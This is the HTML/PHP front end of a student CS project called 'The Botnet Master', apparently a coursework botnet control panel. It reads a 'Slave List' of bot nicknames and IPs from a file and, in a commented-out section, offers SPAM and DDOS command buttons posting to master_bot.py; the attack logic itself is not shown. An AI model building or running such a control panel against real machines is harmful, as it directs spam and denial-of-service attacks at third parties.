
<html lang="en-US">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>::CS project::</title>
<link href="css/singlePageTemplate.css" rel="stylesheet" type="text/css">
<!--The following script tag downloads a font from the Adobe Edge Web Fonts server for use within the web page. We recommend that you do not modify it.-->
<script>var __adobewebfontsappname__="dreamweaver"</script>
<script src="http://use.edgefonts.net/source-sans-pro:n2:default.js" type="text/javascript"></script>
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Slave List">
</head>
<body>
<?php header("refresh:5");?>

<!-- Main Container -->
<div class="container"> 
  <!-- Navigation -->
  <header> <a href="">
    <h4 class="logo">CSProject</h4>
    </a>
    <nav>
      <ul>
        <li> <a href="mailto:emily90091.cs02@g2.nctu.edu.tw">Emily</a><a href="#about"></a></li>
        <li><a href="mailto:amyhsu35@gmail.com">Amy</a><a href="#hero"></a></li>
        <li><a href="mailto:a159697084@gmail.com">Cindy</a><a href="#about"></a></li>
        <li> <a href="mailto:ssbbnn88@gmail.com">Sabrina</a><a href="#contact"></a></li>
      </ul>
    </nav>
  </header>
  <!-- Hero Section -->
  <section class="hero" id="hero">
    <h1 class="hero_header">The Botnet Master</h1>
    <p class="tagline">&nbsp;</p>
  </section>
  <!-- About Section -->
  <h1>&nbsp;</h1>
  <figure>
    <figcaption></figcaption>
  </figure>
  <footer>
    <table width="994" height="239" border="1"  align="center" >
      <tbody>
        <tr>
          <th colspan="4" bgcolor="#0DB0E1" style="font-size: 24px; color: #FFFFFF;" scope="col">Slave List</th>
        </tr>
        <tr>
          <th scope="row">Nickname</th>
          <th scope="row">IP</th><!--
          <th scope="row"><form action="master_bot.py" method="POST" target="id_iframe">
		<input id="Spam" type="submit" value="$SPAM" name="spam">
	    </form></th>
          <th scope="row"><form action="master_bot.py" method="POST" target="id_iframe">
		<input id="ddos" type="submit" value="$DDOS" name="DDOS">
	    </form></th>
        </tr>
        <tr>
          <th bgcolor="#C4C4C4" scope="row">&nbsp;</th>
          <th bgcolor="#C4C4C4" scope="row">&nbsp;</th>
          <th bgcolor="#C4C4C4" scope="row"><input type="checkbox" name="checkbox" id="checkbox">
          SPAM</th>
          <th bgcolor="#C4C4C4" scope="row"><input type="checkbox" name="checkbox2" id="checkbox2">
            DDOS</th>
        </tr>
        <tr>
          <th scope="row">&nbsp;</th>
          <th scope="row">&nbsp;</th>
          <th scope="row">&nbsp;</th>
          <th scope="row">&nbsp;</th>
        </tr>
        <tr>
          <th bgcolor="#C4C4C4" scope="row">&nbsp;</th>
          <th bgcolor="#C4C4C4" scope="row">&nbsp;</th>
          <th bgcolor="#C4C4C4" scope="row">&nbsp;</th>
          <th bgcolor="#C4C4C4" scope="row">&nbsp;</th>-->
        </tr>
	<?php
		    $file=fopen("slave.txt","r") or die("Unable to open file\n" );
		    while(!feof($file)){
			echo "<tr>";
			    $line  = fgets($file);
			    $cols=explode(",",$line);
			    for($i=0;$i<count($cols);$i++){
				echo "<td>";
				echo $cols[$i];
				echo "</td>";
			    }
			    echo "</tr>";
		    }
    		?>
      </tbody>
    </table>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
  </footer>
 
  <!-- Copyrights Section -->
  <div class="copyright">&copy;2016 -cs project</div>
</div>
<!-- Main Container Ends -->
</body>
</html>
